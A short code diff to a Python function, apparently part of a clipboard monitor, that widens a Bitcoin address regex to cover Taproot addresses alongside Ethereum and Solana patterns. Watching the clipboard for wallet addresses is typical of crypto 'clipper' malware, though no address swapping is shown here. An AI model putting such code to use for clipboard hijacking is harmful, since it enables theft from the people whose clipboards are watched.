@@ -13,7 +13,7 @@ clipboard_monitor_active = False
 
 def match_crypto_address(clipboard):
     import re
-    btc_match = re.match(r"^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}$", clipboard)
+    btc_match = re.match(r"^(bc1p|bc1|[13])[a-zA-HJ-NP-Z0-9]{25,62}$", clipboard)
     eth_match = re.match(r"^0x[a-fA-F0-9]{40}$", clipboard, re.IGNORECASE)
     sol_match = re.match(r"^[1-9A-HJ-NP-Za-km-z]{32,44}$", clipboard)
 
